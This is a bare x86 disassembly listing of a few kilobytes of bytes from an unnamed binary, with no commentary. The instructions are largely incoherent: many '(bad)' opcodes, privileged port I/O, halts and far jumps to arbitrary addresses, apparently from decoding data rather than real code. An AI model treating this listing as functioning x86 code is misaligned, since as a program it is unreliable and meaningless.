  4113b1:	shl    BYTE PTR [ebx],0x76
  4113b4:	mov    ebp,0x1135408
  4113b9:	push   ecx
  4113ba:	pop    ebp
  4113bb:	mov    ds:0x1bbfe555,al
  4113c0:	xor    DWORD PTR [ebx+0x6f],ebp
  4113c3:	test   BYTE PTR [ebp-0x1f7dff64],0x4a
  4113ca:	std    
  4113cb:	cmp    bl,bh
  4113cd:	dec    sp
  4113cf:	lock jmp 0xd629a322
  4113d5:	push   ss
  4113d6:	outs   dx,BYTE PTR ds:[esi]
  4113d7:	jbe    0x41135a
  4113d9:	mul    BYTE PTR [eax-0xe3be66d]
  4113df:	cmp    BYTE PTR [eax-0x40],al
  4113e2:	(bad)  
  4113e3:	mov    ecx,0x9c81d60a
  4113e8:	in     al,0x19
  4113ea:	inc    esp
  4113eb:	cwde   
  4113ec:	aad    0x50
  4113ee:	adc    eax,0x55e48cf7
  4113f3:	lds    esi,FWORD PTR [ebp-0x446b0308]
  4113f9:	das    
  4113fa:	jle    0x411434
  4113fc:	jp     0x411468
  4113fe:	scas   eax,DWORD PTR es:[edi]
  4113ff:	aam    0x7f
  411401:	xchg   esi,eax
  411402:	inc    esi
  411403:	iret   
  411404:	call   0x33f5534a
  411409:	pop    ebx
  41140a:	mov    DWORD PTR [eax+0x4b3d0e96],ecx
  411410:	cmp    eax,0xe7b35104
  411415:	mov    eax,0x154e47cf
  41141a:	pop    ss
  41141b:	in     al,0xe8
  41141d:	repnz jmp 0xd091:0x6db849b6
  411425:	pop    ds
  411426:	out    dx,eax
  411427:	jmp    0x411438
  411429:	nop
  41142a:	xchg   DWORD PTR [eax],edi
  41142c:	xchg   DWORD PTR [eax+ebx*1-0x5d],ebp
  411430:	mov    ebp,0x4523d94e
  411435:	push   eax
  411436:	jle    0x411471
  411438:	ja     0x4114a9
  41143a:	out    dx,al
  41143b:	(bad)  
  41143c:	sub    al,0x54
  41143e:	push   esp
  41143f:	adc    bh,BYTE PTR [edi]
  411441:	mov    esi,0x48fcb960
  411446:	test   BYTE PTR [edx+0x6e],0x76
  41144a:	jp     0x4113ec
  41144c:	popa   
  41144d:	cmp    ecx,DWORD PTR [edx-0x12455d82]
  411453:	cwde   
  411454:	(bad)  [edi-0x2a]
  411457:	aam    0xf5
  411459:	stos   BYTE PTR es:[edi],al
  41145a:	adc    BYTE PTR [ecx],ah
  41145c:	inc    eax
  41145d:	fisttp QWORD PTR [esp+eiz*8-0x7e]
  411461:	cmp    edi,DWORD PTR [edx-0x293607c6]
  411467:	or     BYTE PTR [edx-0x62],dh
  41146a:	outs   dx,BYTE PTR ds:[esi]
  41146b:	dec    esi
  41146c:	pop    ebx
  41146d:	and    eax,0xf5814739
  411472:	out    dx,eax
  411473:	cmp    BYTE PTR [eax+0xc],bh
  411476:	ficom  WORD PTR [ebp-0x7da4872a]
  41147c:	cmc    
  41147d:	xchg   ebp,eax
  41147e:	jge    0x4114c1
  411480:	xchg   ecx,eax
  411481:	inc    eax
  411482:	mov    bl,0xfa
  411484:	xor    eax,0xe3ad2538
  411489:	js     0x41144a
  41148b:	ret    
  41148c:	fnstsw WORD PTR [edi+ebp*2+0x3c]
  411490:	inc    eax
  411491:	mov    ebx,0x270a437a
  411496:	mov    esp,0x99f08538
  41149b:	push   esi
  41149c:	push   cs
  41149d:	jg     0x4114fc
  41149f:	mov    al,ds:0xfd6e1573
  4114a4:	stos   DWORD PTR es:[edi],eax
  4114a5:	scas   al,BYTE PTR es:[edi]
  4114a6:	je     0x41145e
  4114a8:	pop    edx
  4114a9:	sub    al,BYTE PTR [ecx+0x6edeb3f0]
  4114af:	imul   ebp,DWORD PTR [esp+eiz*2],0x356d8834
  4114b6:	outs   dx,BYTE PTR ds:[esi]
  4114b7:	mov    ds:0x326d5dd5,eax
  4114bc:	and    eax,0x90395d97
  4114c1:	std    
  4114c2:	pop    ds
  4114c3:	inc    esp
  4114c4:	shl    edi,1
  4114c6:	shr    BYTE PTR [edi],1
  4114c8:	sti    
  4114c9:	adc    al,0x7c
  4114cb:	xchg   esp,eax
  4114cc:	pop    edi
  4114cd:	sbb    eax,0xedf8b8ed
  4114d2:	fnsave [ebp+0x13]
  4114d5:	cmp    BYTE PTR ds:0x74359b7d,ah
  4114db:	call   DWORD PTR [ebp+0x4a]
  4114de:	outs   dx,DWORD PTR ds:[esi]
  4114df:	imul   ebx,DWORD PTR [eax-0x79124cf1],0xee38e9bb
  4114e9:	clc    
  4114ea:	gs popa 
  4114ec:	add    edx,DWORD PTR [ebx+0x1e]
  4114ef:	jo     0x41152e
  4114f1:	ret    0x38bf
  4114f4:	das    
  4114f5:	call   0x3953:0xbaaabe8c
  4114fc:	out    0xbc,eax
  4114fe:	mov    bh,0x67
  411500:	xor    esi,DWORD PTR ds:0x633eeb6d
  411506:	test   al,0x33
  411508:	xlat   BYTE PTR ds:[ebx]
  411509:	icebp  
  41150a:	mov    ss,WORD PTR [eax]
  41150c:	mov    ch,0xad
  41150e:	(bad)  
  41150f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411511:	cmp    cl,BYTE PTR [edx+0x50514b62]
  411517:	jbe    0x411543
  411519:	and    eax,ebp
  41151b:	inc    esp
  41151c:	sub    esp,DWORD PTR ds:0xc1e4704f
  411522:	in     eax,dx
  411523:	pop    ecx
  411524:	neg    BYTE PTR [eax+0x18]
  411527:	sbb    eax,0x39be5e41
  41152c:	pop    ecx
  41152d:	mov    bh,BYTE PTR [edi+ebx*1]
  411530:	adc    DWORD PTR [ebx],ebp
  411532:	rol    BYTE PTR [eax+0x5a],0x7f
  411536:	fiadd  DWORD PTR [esi*8-0x16aee5e1]
  41153d:	xchg   ebx,eax
  41153e:	jmp    0x687921cc
  411543:	jne    0x411586
  411545:	lea    edx,[ebx-0x7cdc5f73]
  41154b:	add    edx,esp
  41154d:	test   al,0x6e
  41154f:	mov    ebp,0x268af59e
  411554:	jmp    0x41158e
  411556:	sub    dl,BYTE PTR [eax+0x2]
  411559:	aad    0xcc
  41155b:	loopne 0x4114e7
  41155d:	hlt    
  41155e:	imul   edi,DWORD PTR [edx],0x6
  411561:	(bad)  
  411563:	sub    DWORD PTR [ebp-0x51cf7bb4],esi
  411569:	jecxz  0x4115e0
  41156b:	sbb    eax,0x371d53f5
  411570:	shl    esp,cl
  411572:	fstp   DWORD PTR [esi*8+0x6e09bdf4]
  411579:	in     al,0xcc
  41157b:	cmp    ebp,eax
  41157d:	cmp    eax,0xd132835
  411582:	cmp    eax,edi
  411584:	std    
  411585:	arpl   di,bx
  411587:	jl     0x41156d
  411589:	fistp  WORD PTR [ecx+0x5228f98c]
  41158f:	stc    
  411590:	fwait
  411591:	jae    0x4115fe
  411593:	sub    dh,ah
  411595:	cmp    edi,DWORD PTR [esi+0x7e]
  411598:	pop    esi
  411599:	mov    al,0xe9
  41159b:	or     BYTE PTR ds:0x69c46eca,ch
  4115a1:	sub    al,0x76
  4115a3:	xchg   edx,eax
  4115a4:	mov    al,ds:0x9c393b2c
  4115a9:	cli    
  4115aa:	in     al,0x6f
  4115ac:	jp     0x4115a7
  4115ae:	stos   DWORD PTR es:[edi],eax
  4115af:	cwde   
  4115b0:	adc    al,BYTE PTR [edi]
  4115b2:	into   
  4115b3:	sbb    esi,DWORD PTR [ebp-0x2324bba1]
  4115b9:	lds    ecx,FWORD PTR [ecx+edi*1]
  4115bc:	mov    bh,0x17
  4115be:	mov    ch,0x2a
  4115c0:	pop    ss
  4115c1:	xchg   edx,eax
  4115c2:	or     eax,0xe20512c3
  4115c7:	cmp    al,0xf5
  4115c9:	call   0xc706b243
  4115ce:	pop    ds
  4115cf:	sbb    bh,BYTE PTR [edx]
  4115d1:	adc    DWORD PTR [esi],0xfffffff9
  4115d4:	xor    ecx,esp
  4115d6:	cvtps2pd xmm4,QWORD PTR [ebx]
  4115d9:	mov    bh,0x6e
  4115db:	mov    eax,0x23c29cae
  4115e0:	add    DWORD PTR [edi],0x33062af4
  4115e6:	jnp    0x41157d
  4115e8:	mov    ch,0xa9
  4115ea:	adc    BYTE PTR [edx-0x5f],bl
  4115ed:	outs   dx,DWORD PTR cs:[esi]
  4115ef:	mov    bh,0xed
  4115f1:	and    BYTE PTR [ebp-0x357c7c27],ah
  4115f7:	aas    
  4115f8:	mov    edx,edi
  4115fa:	fs xor eax,0x6766fbc5
  411600:	mov    ecx,0xd2ed6e00
  411605:	mov    BYTE PTR [esi-0x4cfff083],cl
  41160b:	cmp    dl,ch
  41160d:	minps  xmm7,XMMWORD PTR [esi-0x6477e35e]
  411614:	call   0x42828d56
  411619:	test   al,0x3e
  41161b:	cdq    
  41161c:	push   esp
  41161d:	(bad)  
  41161e:	mov    ah,0x3f
  411620:	mov    edx,DWORD PTR [ebx+0x7]
  411623:	(bad)  
  411624:	arpl   sp,bp
  411626:	bound  edi,QWORD PTR [ecx-0x2b]
  411629:	test   DWORD PTR [ecx],ecx
  41162b:	stos   BYTE PTR es:[edi],al
  41162c:	cmc    
  41162d:	sti    
  41162e:	test   BYTE PTR [edi+0x45ff79b9],cl
  411634:	data16 cmp BYTE PTR [edx],dl
  411637:	ret    0xdc8a
  41163a:	inc    ecx
  41163b:	repz and edx,DWORD PTR [eax+0x3807c9ad]
  411642:	xchg   ebx,eax
  411643:	(bad)  
  411644:	jmp    0x68804168
  411649:	cmp    BYTE PTR ds:0xe4794976,dh
  41164f:	and    al,0x4a
  411651:	and    al,0x6a
  411653:	mov    edx,0x5f324559
  411658:	dec    ebx
  411659:	mov    al,0x92
  41165b:	or     eax,0x590138ed
  411660:	mov    DWORD PTR [eax+ebp*8+0x6f00b506],esp
  411667:	enter  0xb10f,0x3f
  41166b:	xor    dh,BYTE PTR [edx+0x2]
  41166e:	dec    esi
  41166f:	fisttp DWORD PTR [ebx]
  411671:	cmp    ebx,DWORD PTR [esi+0x78]
  411674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411675:	xchg   ebp,eax
  411676:	aam    0xdc
  411678:	jns    0x4116be
  41167a:	add    cl,BYTE PTR [ecx]
  41167c:	cmc    
  41167d:	out    dx,eax
  41167e:	xor    al,0x65
  411680:	or     BYTE PTR [eax],cl
  411682:	jmp    0x44fc:0xae3bb175
  411689:	xor    ebp,esi
  41168b:	(bad)
  41168e:	outs   dx,BYTE PTR ds:[esi]
  41168f:	int3   
  411690:	adc    ebx,ebx
  411692:	fs push cs
  411694:	mov    ecx,ebp
  411696:	xchg   ecx,eax
  411697:	cmp    cl,dh
  411699:	adc    ebp,DWORD PTR [edi-0x58]
  41169c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41169d:	and    BYTE PTR [ecx+eiz*8-0x65179414],al
  4116a4:	scas   al,BYTE PTR es:[edi]
  4116a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116a6:	sahf   
  4116a7:	cli    
  4116a8:	pop    ebp
  4116a9:	(bad)  
  4116ab:	cmp    BYTE PTR [esi+0x4cffee7a],bl
  4116b1:	inc    edi
  4116b2:	pusha  
  4116b3:	and    DWORD PTR [ebp-0x52409167],edi
  4116b9:	add    bh,BYTE PTR [edi+0x398921ce]
  4116bf:	cmp    DWORD PTR [ebp-0x10a4d9e4],esp
  4116c5:	jmp    0xd8bf:0x55f5b5eb
  4116cc:	mov    ds:0xa3d10701,al
  4116d1:	and    DWORD PTR [ecx+edi*1],ebx
  4116d4:	std    
  4116d5:	sbb    BYTE PTR [eax],bh
  4116d7:	jne    0x411713
  4116d9:	and    BYTE PTR [esi+eiz*1],0xec
  4116dd:	inc    ecx
  4116de:	xor    al,cl
  4116e0:	mov    ds:0x7f1f484b,al
  4116e5:	sbb    edi,DWORD PTR [edx]
  4116e7:	push   esp
  4116e8:	and    bh,BYTE PTR [eax]
  4116ea:	or     al,0x95
  4116ec:	js     0x41176a
  4116ee:	xor    BYTE PTR ds:[ebx+0x6],dh
  4116f2:	dec    eax
  4116f3:	cmp    al,0x14
  4116f5:	xchg   edx,eax
  4116f6:	icebp  
  4116f7:	in     al,dx
  4116f8:	xchg   esp,eax
  4116f9:	xchg   edx,eax
  4116fa:	outs   dx,BYTE PTR ds:[esi]
  4116fb:	adc    ebp,DWORD PTR [esp+ebp*2]
  4116fe:	jb     0x411754
  411700:	push   0x38
  411702:	clc    
  411703:	push   es
  411704:	gs js  0x4116bf
  411707:	xchg   ebx,eax
  411708:	out    0x73,al
  41170a:	outs   dx,DWORD PTR ds:[esi]
  41170b:	cli    
  41170c:	cwde   
  41170d:	jge    0x411776
  41170f:	xchg   edi,eax
  411710:	xchg   ebx,eax
  411711:	xchg   DWORD PTR [edi],edi
  411713:	cmp    DWORD PTR [edx],ebx
  411715:	and    DWORD PTR [edi],ebx
  411717:	adc    DWORD PTR [ebp+0x144590a4],esi
  41171d:	jg     0x411735
  41171f:	push   ss
  411720:	jbe    0x411747
  411722:	rol    BYTE PTR ds:0x899e83e5,cl
  411728:	jg     0x411767
  41172a:	xchg   ecx,eax
  41172b:	dec    edx
  41172c:	mov    esp,0xddf48db6
  411731:	out    dx,al
  411732:	shr    esp,cl
  411734:	out    dx,al
  411735:	ins    BYTE PTR es:[edi],dx
  411736:	cmp    eax,0xeecf7d42
  41173b:	add    DWORD PTR [esi+0x13847ad2],eax
  411741:	jl     0x4116d3
  411743:	iret   
  411744:	xor    eax,0xafb83c61
  411749:	push   cx
  41174b:	rcr    esp,0x3b
  41174e:	clc    
  41174f:	dec    ecx
  411750:	or     eax,0x3c8cc419
  411755:	call   0x7b10:0x8720b969
  41175c:	inc    eax
  41175d:	jbe    0x4117cc
  41175f:	add    DWORD PTR [esp+esi*2-0x5c334b91],ebp
  411766:	retf   0x3e06
  411769:	icebp  
  41176a:	imul   eax,DWORD PTR [edi],0x61db4c64
  411770:	jae    0x4116fd
  411772:	cs and eax,0x25dfe545
  411778:	call   0x963f47e1
  41177d:	sub    eax,0xd86b7841
  411782:	add    dl,BYTE PTR ds:0xb967a23e
  411788:	push   esi
  411789:	or     ecx,DWORD PTR [eax]
  41178b:	and    al,0x9b
  41178d:	jmp    0x72e8:0xcb4905d9
  411794:	mov    esi,ecx
  411796:	jmp    0xefa08d4f
  41179b:	mov    edx,0x7f7e7b54
  4117a0:	push   ss
  4117a1:	mov    eax,ds:0x345f78e8
  4117a6:	cwde   
  4117a7:	pop    esp
  4117a8:	outs   dx,DWORD PTR ds:[esi]
  4117a9:	cmp    BYTE PTR [esi],ah
  4117ab:	xchg   esi,eax
  4117ac:	movaps XMMWORD PTR [eax+eax*8+0x26f6d68],xmm6
  4117b4:	fwait
  4117b5:	adc    DWORD PTR [edi+ecx*8],0xffffff91
  4117b9:	mov    esi,0x455839a1
  4117be:	fwait
  4117bf:	mov    DWORD PTR [ebx+0x35],edi
  4117c2:	pop    ebx
  4117c3:	stc    
  4117c4:	rol    edi,cl
  4117c6:	dec    ebx
  4117c7:	cmp    BYTE PTR [eax],dh
  4117c9:	leave  
  4117ca:	add    ch,BYTE PTR [eax+0x19432cfe]
  4117d0:	ret    0xabc0
  4117d3:	mov    esi,0x107c3b8e
  4117d8:	jnp    0x4117d5
  4117da:	mov    es,esp
  4117dc:	xor    DWORD PTR [edx],0x6e
  4117df:	xchg   edx,eax
  4117e0:	mov    ch,0x65
  4117e2:	out    0x83,al
  4117e4:	addr16 cmp eax,0x795012f
  4117ea:	lods   eax,DWORD PTR ds:[esi]
  4117eb:	retf   0x7d75
  4117ee:	xchg   esp,eax
  4117ef:	cli    
  4117f0:	xor    cl,BYTE PTR [ebx+esi*1]
  4117f3:	push   0x783a35d
  4117f8:	data16 cmp dl,bl
  4117fb:	xchg   ecx,eax
  4117fc:	lods   al,BYTE PTR ds:[esi]
  4117fd:	push   cs
  4117fe:	dec    eax
  4117ff:	add    al,BYTE PTR [ebp-0x2a149cf8]
  411805:	adc    al,0x4e
  411807:	fs loope 0x411856
  41180a:	aam    0xd0
  41180c:	cmc    
  41180d:	out    0x98,al
  41180f:	out    dx,eax
  411810:	out    0x31,al
  411812:	sub    DWORD PTR [edx+0x6f],esp
  411815:	cmp    dl,bh
  411817:	dec    ecx
  411818:	nop
  411819:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41181b:	jns    0x4117cf
  41181d:	mov    ah,0x6e
  41181f:	mov    edx,0x64d8ea15
  411824:	push   cs
  411825:	push   ecx
  411826:	adc    BYTE PTR [ecx],bh
  411828:	inc    ecx
  411829:	mov    al,0x6d
  41182c:	jl     0x41180e
  41182e:	arpl   dx,ax
  411830:	adc    DWORD PTR [edx],ebx
  411832:	call   0x3a39:0x11b15bf0
  411839:	call   0x616e:0x97115440
  411840:	dec    edx
  411841:	and    DWORD PTR [edi-0x10],esp
  411844:	mov    eax,ds:0x963fd512
  411849:	aad    0xcf
  41184b:	add    esp,DWORD PTR [esi]
  41184d:	cs addr16 retf 0xc70c
  411852:	outs   dx,BYTE PTR ds:[esi]
  411853:	push   edi
  411854:	out    0x4,al
  411856:	inc    edx
  411857:	(bad)  
  411858:	clc    
  411859:	xchg   ebx,eax
  41185a:	in     eax,0x4
  41185c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41185e:	outs   dx,BYTE PTR ds:[esi]
  41185f:	push   edx
  411860:	pop    edi
  411861:	int3   
  411862:	imul   ecx,DWORD PTR [edx-0x67],0xa2406856
  411869:	out    dx,eax
  41186a:	test   BYTE PTR [edx+ecx*4-0x9],0x2a
  41186f:	imul   esp,esi,0x38
  411872:	xor    BYTE PTR [ecx],al
  411874:	loope  0x41188d
  411876:	or     al,0xe4
  411878:	jbe    0x41181d
  41187a:	outs   dx,BYTE PTR ds:[esi]
  41187b:	dec    esi
  41187c:	ins    DWORD PTR es:[edi],dx
  41187d:	retf   0x2f1
  411880:	push   ds
  411881:	test   BYTE PTR [esi+0x687b9f00],bh
  411887:	mov    al,ds:0x3e39be80
  41188c:	cdq    
  41188d:	dec    ebx
  41188e:	sbb    eax,0xaf9a5d2f
  411893:	into   
  411894:	or     ebp,DWORD PTR [edx+0x71]
  411897:	imul   esi,ebp,0x3fc68baa
  41189d:	stos   DWORD PTR es:[edi],eax
  41189e:	ret    0x3838
  4118a1:	inc    ebp
  4118a2:	xchg   edi,ebp
  4118a4:	push   ds
  4118a5:	(bad)  
  4118a6:	pushf  
  4118a7:	push   0xbe61bba0
  4118ac:	dec    edx
  4118ad:	test   al,0x42
  4118af:	data16 (bad) 
  4118b2:	scas   eax,DWORD PTR es:[edi]
  4118b3:	sbb    edi,DWORD PTR [edx]
  4118b5:	ret    
  4118b6:	xor    bh,BYTE PTR [ecx-0x94b6696]
  4118bc:	fisubr DWORD PTR [bp-0x70]
  4118c0:	push   0x24445aa7
  4118c5:	ins    BYTE PTR es:[edi],dx
  4118c6:	rol    ebp,cl
  4118c8:	int    0x3b
  4118ca:	inc    esp
  4118cb:	mov    al,0x12
  4118cd:	es mov bl,0xd1
  4118d0:	(bad)  
  4118d1:	fisttp WORD PTR [ebp+0x2e17c4fe]
  4118d7:	sbb    ebp,DWORD PTR [eax]
  4118d9:	xor    al,0xe6
  4118db:	sub    eax,0xd9cc3bde
  4118e0:	sbb    eax,0xa183
  4118e5:	xchg   edx,eax
  4118e6:	dec    eax
  4118e7:	sub    BYTE PTR [ebp-0x721f967f],al
  4118ed:	dec    ecx
  4118ee:	sbb    eax,0x30683ff3
  4118f3:	popf   
  4118f4:	mov    WORD PTR [ebx],?
  4118f6:	xchg   ecx,eax
  4118f7:	sub    eax,0x3b9c6936
  4118fc:	(bad)  
  4118fd:	jle    0x41196e
  4118ff:	shr    esp,0x9d
  411902:	shr    BYTE PTR [ebp+eiz*2-0x4cb18faa],cl
  411909:	cmp    edx,DWORD PTR [eax+0x59]
  41190c:	jne    0x41194c
  41190e:	and    esp,DWORD PTR [ecx+0x62]
  411911:	mov    ebx,0x925db06e
  411916:	mov    bh,0xf3
  411918:	dec    edi
  411919:	je     0x411971
  41191b:	int3   
  41191c:	add    DWORD PTR [edx],ecx
  41191e:	mov    ah,0xf
  411920:	out    0x31,al
  411922:	arpl   WORD PTR [ebp-0x54ad3473],bp
  411928:	push   cs
  411929:	mov    al,0x75
  41192b:	xchg   esp,eax
  41192c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41192d:	(bad)  
  41192e:	sbb    ebp,DWORD PTR [esi+0x168ceff5]
  411934:	test   DWORD PTR [ebx],edi
  411936:	xor    DWORD PTR [esp+edx*2],ecx
  411939:	aam    0xfb
  41193b:	pop    eax
  41193c:	mov    cl,0xe4
  41193e:	jge    0x4118d0
  411940:	dec    eax
  411941:	loop   0x411932
  411943:	mov    eax,0xd2e40850
  411948:	adc    eax,0xe40ad338
  41194d:	out    dx,eax
  41194e:	xchg   edi,eax
  41194f:	cmp    ebx,ecx
  411951:	adc    DWORD PTR [eax+ecx*8-0xb],edx
  411955:	fistp  WORD PTR [ecx]
  411957:	fcmovb st,st(6)
  411959:	mov    al,BYTE PTR [esi]
  41195b:	sbb    eax,0xfc4d3a94
  411960:	out    0x7d,al
  411962:	mov    cs,WORD PTR [ebp+ebx*8+0x3bf55eb]
  411969:	ss out dx,eax
  41196b:	dec    esi
  41196c:	xor    bh,BYTE PTR [ebp-0x107a3d91]
  411972:	or     DWORD PTR [eax+0x542f1555],edx
  411978:	mov    ds:0xa67c843e,eax
  41197d:	inc    edi
  41197e:	hlt    
  41197f:	mov    eax,0xc9dbc676
  411984:	cmc    
  411985:	jae    0x411955
  411987:	xor    ch,al
  411989:	dec    edx
  41198a:	push   ebx
  41198b:	inc    BYTE PTR [ebx-0x19]
  41198e:	mov    edi,0xa33847e4
  411993:	mov    ch,0xa9
  411995:	popa   
  411996:	aam    0x8
  411998:	adc    eax,0x83336f46
  41199d:	dec    ebx
  41199e:	arpl   WORD PTR fs:[ecx+0x60c1d6b2],cx
  4119a5:	cmp    BYTE PTR [ecx-0x42c1ac7b],cl
  4119ab:	imul   ecx,eax,0x8
  4119ae:	outs   dx,BYTE PTR ds:[esi]
  4119af:	pusha  
  4119b0:	(bad)  
  4119b1:	outs   dx,BYTE PTR ds:[esi]
  4119b2:	xchg   edi,eax
  4119b3:	sbb    BYTE PTR [ebx],bh
  4119b5:	fmul   st,st(7)
  4119b7:	cmp    bh,bl
  4119b9:	push   ebx
  4119ba:	mov    esp,0x51cb4cee
  4119bf:	push   edi
  4119c0:	jmp    0xac82bbf
  4119c5:	cmc    
  4119c6:	cs jno 0x411a3e
  4119c9:	ret    
  4119ca:	jle    0x411a04
  4119cc:	xchg   ebx,eax
  4119cd:	mov    ds:0x6738fc3d,al
  4119d2:	pop    edx
  4119d3:	out    0xf5,eax
  4119d5:	sub    al,BYTE PTR [eax]
  4119d7:	lahf   
  4119d8:	inc    ebp
  4119d9:	shl    DWORD PTR [edi+edx*2],cl
  4119dc:	popa   
  4119dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119de:	jmp    0xcce6:0x1fe40238
  4119e5:	xchg   ebx,eax
  4119e6:	iret   
  4119e7:	sub    eax,0xab77baec
  4119ec:	(bad)  
  4119ed:	addr16 das 
  4119ef:	push   edx
  4119f0:	mov    esp,0x953945f8
  4119f5:	sahf   
  4119f6:	sub    bh,bl
  4119f8:	jns    0x4119d3
  4119fa:	mov    dl,0x82
  4119fc:	cmp    eax,0xd6b89736
  411a01:	add    bl,BYTE PTR [eax+0x19]
  411a04:	inc    ebp
  411a05:	jno    0x411a29
  411a07:	dec    ebp
  411a08:	mov    dh,0x3d
  411a0a:	xor    BYTE PTR [esp+ebp*2+0x77],dh
  411a0e:	sub    eax,0xa085559c
  411a13:	xlat   BYTE PTR ds:[ebx]
  411a14:	cmc    
  411a15:	push   es
  411a16:	shl    BYTE PTR [edi+ecx*4],cl
  411a19:	(bad)  
  411a1a:	jnp    0x4119a6
  411a1c:	xchg   ebp,eax
  411a1d:	cmp    ebx,eax
  411a1f:	stc    
  411a20:	push   esi
  411a21:	cmp    edi,DWORD PTR [edi-0x72d9f779]
  411a27:	lds    ebp,FWORD PTR [ecx-0x54]
  411a2a:	cs in  eax,0xd4
  411a2d:	or     al,0xa8
  411a2f:	jle    0x4119d9
  411a31:	clc    
  411a32:	add    DWORD PTR [edx+esi*4+0x38],0xffffffe8
  411a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a38:	out    dx,eax
  411a39:	mov    al,0xcc
  411a3b:	fidiv  WORD PTR [esi]
  411a3d:	and    dh,ch
  411a3f:	sub    eax,0x7faf6ef5
  411a44:	dec    ecx
  411a45:	and    DWORD PTR [edx-0x1df216d0],edx
  411a4b:	(bad)  [eax+0x77492d3b]
  411a51:	pushaw 
  411a53:	sbb    eax,0xf1694f5
  411a58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a59:	jb     0x4119df
  411a5b:	retf   0xb8d5
  411a5e:	or     BYTE PTR [esi],bh
  411a60:	adc    eax,0x7a467ac0
  411a65:	dec    ebp
  411a66:	es cmp dh,BYTE PTR gs:[ecx+0x4ff5a964]
  411a6e:	push   es
  411a6f:	mov    eax,ds:0x697d3c4a
  411a74:	inc    esp
  411a75:	xor    eax,0x8a148322
  411a7a:	outs   dx,BYTE PTR ds:[esi]
  411a7b:	sbb    ecx,DWORD PTR [edx+edx*2]
  411a7e:	pushf  
  411a7f:	int    0xb
  411a81:	push   ebp
  411a82:	sub    ch,dl
  411a84:	call   0x69a838a9
  411a89:	js     0x411b01
  411a8b:	jno    0x411ae9
  411a8d:	cmp    BYTE PTR [ebp-0x2cf95659],bl
  411a93:	(bad)  
  411a94:	outs   dx,DWORD PTR ds:[esi]
  411a95:	jp     0x411aee
  411a97:	(bad)  
  411a98:	adc    al,0xdb
  411a9a:	push   0xde8ab51b
  411a9f:	aaa    
  411aa0:	xor    dl,dh
  411aa2:	daa    
  411aa3:	and    ecx,DWORD PTR [eax]
  411aa5:	clc    
  411aa6:	inc    eax
  411aa7:	cmp    DWORD PTR [esi+edi*1+0x73],ebx
  411aab:	(bad)  
  411aac:	xchg   esi,eax
  411aad:	sbb    eax,0x1facd96e
  411ab2:	out    0xb6,al
  411ab4:	sar    BYTE PTR [esi],cl
  411ab6:	rol    bh,0x41
  411ab9:	cmp    ecx,esi
  411abb:	pop    ecx
  411abc:	out    0x41,eax
  411abe:	or     edx,DWORD PTR [ebx-0xf23aff4]
  411ac4:	cmc    
  411ac5:	jmp    0x411a86
  411ac7:	call   0x38e5:0x82c4d7b0
  411ace:	into   
  411acf:	ins    DWORD PTR es:[edi],dx
  411ad0:	push   ax
  411ad2:	mov    esi,DWORD PTR [esi+0xc6e11af]
  411ad8:	shr    BYTE PTR [edx+esi*4+0x1d],0x50
  411add:	pop    ebx
  411ade:	nop
  411adf:	cmp    bl,al
  411ae1:	inc    esp
  411ae2:	or     BYTE PTR [edi-0x63dfcaaf],bl
  411ae8:	cmc    
  411ae9:	push   ebx
  411aea:	xchg   dl,dl
  411aec:	int    0x5d
  411aee:	sbb    eax,DWORD PTR [esi+ebx*1]
  411af1:	cmp    ch,ah
  411af3:	(bad)  
  411af4:	mov    dh,0xc9
  411af6:	mov    ebp,DWORD PTR [edx+0x6f6e9e82]
  411afc:	push   edx
  411afd:	push   ds
  411afe:	fisttp WORD PTR [edi]
  411b00:	adc    eax,0x751a1add
  411b05:	aaa    
  411b06:	into   
  411b07:	clc    
  411b08:	xor    DWORD PTR [esi-0x69],edx
  411b0b:	fcmovnb st,st(5)
  411b0d:	nop
  411b0e:	pop    eax
  411b0f:	retf   0xf3f6
  411b12:	pop    es
  411b13:	test   al,0xbb
  411b15:	jns    0x411b66
  411b17:	mov    ch,0xd9
  411b19:	and    DWORD PTR [ebx],ecx
  411b1b:	sub    ah,al
  411b1d:	neg    eax
  411b1f:	jns    0x411adc
  411b21:	cmp    ebp,DWORD PTR [edi]
  411b23:	aad    0x1d
  411b25:	mov    eax,ds:0xb0f5d731
  411b2a:	xchg   edx,eax
  411b2b:	sar    BYTE PTR [eax],0xa5
  411b2e:	dec    eax
  411b2f:	cld    
  411b30:	sub    al,0x38
  411b32:	outs   dx,DWORD PTR ds:[esi]
  411b33:	out    dx,eax
  411b34:	ror    DWORD PTR [eax+0x14c7eb5e],cl
  411b3a:	mov    dh,0x3c
  411b3c:	pop    edi
  411b3d:	cmp    BYTE PTR [edi],cl
  411b3f:	xchg   edi,eax
  411b40:	cmp    eax,0xd9b2efaa
  411b45:	cmp    edi,edx
  411b47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b48:	xor    bl,BYTE PTR [ecx+0x3b28a3eb]
  411b4e:	outs   dx,BYTE PTR ds:[esi]
  411b4f:	cmp    eax,0xfd76c9fd
  411b54:	retf   
  411b55:	sub    DWORD PTR ds:0xc5830b39,esi
  411b5b:	mov    ebx,0x9da007b4
  411b60:	cmc    
  411b61:	in     al,dx
  411b62:	shr    DWORD PTR [ebx-0x46],1
  411b65:	xchg   ecx,eax
  411b66:	in     al,0xb1
  411b68:	nop
  411b69:	cmp    edi,ecx
  411b6b:	ror    BYTE PTR [ebp-0x2d876ca9],0x4c
  411b72:	outs   dx,DWORD PTR ds:[esi]
  411b73:	stos   BYTE PTR es:[edi],al
  411b74:	mov    bh,bl
  411b76:	xchg   edi,eax
  411b77:	add    bh,cl
  411b79:	mov    eax,ds:0x95731b6a
  411b7e:	mov    cx,0xb94f
  411b82:	pop    ds
  411b83:	jbe    0x411baf
  411b85:	or     ebp,DWORD PTR [esi+0x72]
  411b88:	retf   
  411b89:	shl    BYTE PTR [ecx],cl
  411b8b:	into   
  411b8c:	(bad)  
  411b8d:	xchg   ebp,eax
  411b8e:	and    al,0x25
  411b90:	sbb    cl,bl
  411b92:	adc    edi,ecx
